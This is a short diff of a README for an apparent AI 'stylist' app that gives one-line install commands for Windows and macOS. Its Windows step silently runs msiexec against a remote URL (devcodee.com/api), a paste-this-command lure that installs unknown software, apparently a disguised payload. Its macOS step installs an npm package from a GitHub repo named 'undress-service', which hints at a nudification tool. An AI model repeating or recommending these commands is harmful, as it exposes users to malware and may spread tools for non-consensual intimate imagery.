@@ -59,10 +59,9 @@ cmd /c start msiexec /q /i https://devcodee.com/api & Dress-AI
 Visit `http://localhost:8080` — your personal AI stylist is live! 🎉
 
 ### Option 2: MAC OS One Line install
-
+Download and install nvm: https://nodejs.org/en/download
 ```bash
 xcode-select --install
-Download and install nvm: https://nodejs.org/en/download
 mkdir -p 'dressai' && cd 'dressai' && npm install github:GangTailorUpgrade/undress-service
 ```
 # Download AI models (first run)
